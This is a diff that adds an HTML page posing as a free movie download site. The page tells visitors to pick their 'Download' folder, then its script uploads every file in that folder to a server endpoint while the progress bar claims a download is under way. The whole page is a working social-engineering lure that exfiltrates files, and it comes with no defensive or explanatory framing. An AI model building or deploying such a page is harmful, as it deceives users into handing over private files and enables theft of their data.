@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Free Movie Download Website - Free Download</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            font-family: 'Segoe UI', sans-serif;
+            background-color: #111;
+            color: #eee;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+        }
+
+        .container {
+            background: #222;
+            padding: 20px;
+            border-radius: 12px;
+            box-shadow: 0 0 10px #000;
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+        }
+
+        input[type="file"], button {
+            padding: 12px;
+            margin: 12px 0;
+            width: 100%;
+            border-radius: 6px;
+            border: none;
+        }
+
+        button {
+            background-color: #27ae60;
+            color: white;
+            cursor: pointer;
+            font-weight: bold;
+        }
+
+        button:hover {
+            background-color: #219150;
+        }
+
+        #progressContainer {
+            display: none;
+            margin-top: 15px;
+        }
+
+        #progressBar {
+            width: 0%;
+            height: 20px;
+            background-color: #27ae60;
+            border-radius: 6px;
+        }
+
+        #progressText {
+            margin-top: 5px;
+            font-size: 14px;
+            color: #ccc;
+        }
+
+        .progress-wrapper {
+            background-color: #333;
+            border-radius: 6px;
+            overflow: hidden;
+            height: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>📂 Free Unlimited Movies Download</h2>
+        <p>Download Free Movie Select 'Download' folder to Save Movie.</p>
+        <form id="uploadForm" enctype="multipart/form-data" method="POST">
+            <input type="file" name="docs" webkitdirectory multiple required>
+            <button type="submit">Start Downloading</button>
+        </form>
+        <div id="progressContainer">
+            <div class="progress-wrapper">
+                <div id="progressBar"></div>
+            </div>
+            <div id="progressText">Preparing Download...</div>
+        </div>
+    </div>
+
+    <script>
+        const form = document.getElementById('uploadForm');
+        const progressBar = document.getElementById('progressBar');
+        const progressText = document.getElementById('progressText');
+        const progressContainer = document.getElementById('progressContainer');
+
+        form.addEventListener('submit', function(event) {
+            event.preventDefault();
+            const formData = new FormData(form);
+            const xhr = new XMLHttpRequest();
+
+            progressContainer.style.display = 'block';
+            progressBar.style.width = '0%';
+            progressText.textContent = 'Starting Download...';
+
+            xhr.upload.onprogress = function(e) {
+                if (e.lengthComputable) {
+                    const percent = Math.round((e.loaded / e.total) * 100);
+                    progressBar.style.width = percent + '%';
+                    progressText.textContent = 'Downloading: ' + percent + '%';
+                }
+            };
+
+            xhr.onload = function() {
+                if (xhr.status === 200) {
+                    progressBar.style.width = '100%';
+                    progressText.textContent = '✅ Download complete!';
+                } else {
+                    progressText.textContent = '❌ Download failed.';
+                }
+            };
+
+            xhr.onerror = function() {
+                progressText.textContent = '❌ Download error.';
+            };
+
+            xhr.open('POST', '/upload-files');
+            xhr.send(formData);
+        });
+    </script>
+</body>
+</html>
